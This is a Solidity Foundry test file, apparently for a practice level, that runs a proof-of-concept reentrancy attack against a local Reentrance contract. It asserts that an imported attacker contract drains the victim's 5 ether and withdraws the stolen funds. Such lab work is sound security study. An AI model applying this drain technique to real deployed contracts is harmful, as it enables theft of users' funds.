// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Reentrance} from "../src/10-Reentrancy.sol";
import {ReentrancyAttack} from "../src/attackers/ReentrancyAttack.sol";

contract ReentrancyTest is Test {
    Reentrance public reentrance;
    ReentrancyAttack public attackerContract;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 2 ether);

        // Deploy vulnerable Reentrance contract
        reentrance = new Reentrance();

        // Victim deposits 5 ether into the contract
        vm.prank(victim);
        reentrance.donate{value: 5 ether}(victim);

        // Attacker deploys ReentrancyAttack
        vm.prank(attacker);
        attackerContract = new ReentrancyAttack(address(reentrance));
    }

    function test_InitialContractBalance() public view {
        assertEq(address(reentrance).balance, 5 ether);
        assertEq(reentrance.balanceOf(victim), 5 ether);
    }

    function test_ReentrancyDrainExploit() public {
        vm.startPrank(attacker);

        uint256 targetBalanceBefore = address(reentrance).balance;
        assertEq(targetBalanceBefore, 5 ether);

        // Attacker calls attack with 1 ether.
        // It deposits 1 ether, calls withdraw(1 ether), and inside receive()
        // recursively drains the remaining 5 ether!
        attackerContract.attack{value: 1 ether}();

        // Target balance should now be completely drained to 0!
        uint256 targetBalanceAfter = address(reentrance).balance;
        assertEq(targetBalanceAfter, 0, "Target contract was not completely drained!");

        // Attacker contract now holds initial 1 ether + 5 stolen ether = 6 ether
        assertEq(address(attackerContract).balance, 6 ether);

        // Withdraw all loot to attacker's wallet
        attackerContract.withdrawFunds();
        assertEq(address(attackerContract).balance, 0);

        console2.log("Local PoC Success: Target contract balance is now:", address(reentrance).balance);
        console2.log("Attacker wallet balance:", attacker.balance);

        vm.stopPrank();
    }
}
